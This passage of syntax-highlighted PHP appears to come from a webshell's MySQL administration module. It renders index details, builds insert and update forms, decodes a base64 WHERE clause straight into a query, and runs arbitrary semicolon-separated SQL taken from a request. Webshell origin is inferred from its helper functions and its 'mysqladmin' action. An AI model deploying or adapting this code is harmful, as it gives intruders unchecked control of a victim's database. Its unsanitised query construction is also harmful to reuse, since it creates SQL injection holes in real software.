<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Column_name'</span>].($<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Sub_part'</span>] ? <span style="color: #8abeb7;">'('</span>.$<span style="color: #f0c674;">ro</span><span style="color: #f0c674; text-decoration: underline;">w</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'Sub_part'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">')'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.($<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Cardinality'</span>] ? $<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Cardinality'</span>] : <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>)<span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Collation'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Null'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Comment'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">tbfoot(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'insert'</span> || $<span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'edit'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">result</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">'SHOW COLUMNS FROM '</span>.$<span style="color: #f0c674;">tablename</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> ($<span style="color: #f0c674;">row</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_fetch_array(</span>$<span style="color: #f0c674;">result</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">rowdb</span>[] = $<span style="color: #f0c674;">row</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">rs</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'insert'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h2&gt;Insert new line in '</span>.$<span style="color: #f0c674;">tablename</span>.<span style="color: #8abeb7;">' table &amp;raquo;&lt;/</span><span style="color: #8abeb7; text-decoration: underline;">h2&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h2&gt;Update record in '</span>.$<span style="color: #f0c674;">tablename</span>.<span style="color: #8abeb7;">' table &amp;raquo;&lt;/h2</span><span style="color: #8abeb7; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">where</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">base64_decode(</span>$<span style="color: #f0c674;">base64</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">result</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"SELECT * FROM $tablename WHERE $where LIMIT</span><span style="color: #8abeb7; text-decoration: underline;"> 1"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">rs</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_fetch_array(</span>$<span style="color: #f0c674;">result</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;form method="post" action="'</span>.$<span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span>$<span style="color: #f0c674;">dbform</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'mysqladmin'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'tablename'</span>,$<span style="color: #f0c674;">tablename</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> ($<span style="color: #f0c674;">rowdb</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">row</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">rs</span>[$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>]]) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">value</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">htmlspecialchars(</span>$<span style="color: #f0c674;">rs</span>[$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>]]);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">value</span> = <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">thisbg</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">bg(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="'</span>.$<span style="color: #f0c674;">thisbg</span>.<span style="color: #8abeb7;">'" onmouseover="this.className=\</span><span style="color: #8abeb7; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Key'</span>] == <span style="color: #8abeb7;">'UNI'</span> || $<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Extra'</span>] == <span style="color: #8abeb7;">'auto_incre</span><span style="color: #8abeb7; text-decoration: underline;">ment'</span><span style="text-decoration: underline;"> || $</span><span style="color: #f0c674; text-decoration: underline;">row</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;&lt;b&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>].<span style="color: #8abeb7;">'&lt;/b&gt;&lt;br /&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Type'</span>].<span style="color: #8abeb7; text-decoration: underline;">'&lt;/td&gt;&lt;td&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">value</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {<span style="color: #cc6666; background-color: #373b41;">                            </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;&lt;b&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>].<span style="color: #8abeb7;">'&lt;/b&gt;&lt;br /&gt;'</span>.$<span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Type'</span>].<span style="color: #8abeb7; text-decoration: underline;">'&lt;/td&gt;&lt;td&gt;&lt;textarea class="area" name="insertsql['</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">row</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'Field'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">']" style="width:500px;height:60px;overflow:auto;"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">value</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'insert'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">bg(</span>).<span style="color: #8abeb7;">'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt</span><span style="color: #8abeb7; text-decoration: underline;">" type="submit" name="insert" value="Insert" /&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">bg(</span>).<span style="color: #8abeb7;">'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt</span><span style="color: #8abeb7; text-decoration: underline;">" type="submit" name="update" value="Update" /&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'base64'</span>, $<span style="color: #f0c674;">base64</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/table&gt;&lt;/form&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">querys</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">explode(</span><span style="color: #8abeb7;">';'</span>,$<span style="color: #f0c674;">sql_query</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>($<span style="color: #f0c674;">querys</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">num</span>=&gt;$<span style="color: #f0c674;">query</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">query</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">"&lt;p&gt;&lt;b&gt;Query#{$num} : "</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">htmlspecialchars(</span>$<span style="color: #f0c674;">query</span>,<span style="color: #81a2be;">EN</span><span style="color: #81a2be; text-decoration: underline;">T_QUOTES</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">"&lt;/b&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">switch</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">qy(</span>$<span style="color: #f0c674;">query</span>))
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">case</span> <span style="color: #81a2be;">0</span>:
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h2&gt;Error : '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_error(</span>).<span style="color: #8abeb7;">'&lt;/h2&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">break</span>;<span style="color: #cc6666; background-color: #373b41;">  </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">case</span> <span style="color: #81a2be;">1</span>:
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">strtolower(substr(</span>$<span style="color: #f0c674;">query</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">13</span>)) == <span style="color: #8abeb7;">'sele</span><span style="color: #8abeb7; text-decoration: underline;">ct * from'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">allowedit</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">getnumsql</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">tatol</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_num_rows(q(</span>$<span style="color: #f0c674;">getnumsql</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">multipage</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">multi(</span>$<span style="color: #f0c674;">tatol</span>, $<span style="color: #f0c674;">pagenum</span>, $<span style="color: #f0c674;">pa</span><span style="color: #f0c674; text-decoration: underline;">ge</span><span style="text-decoration: underline;">, $</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!$<span style="color: #f0c674;">tablename</span>) {
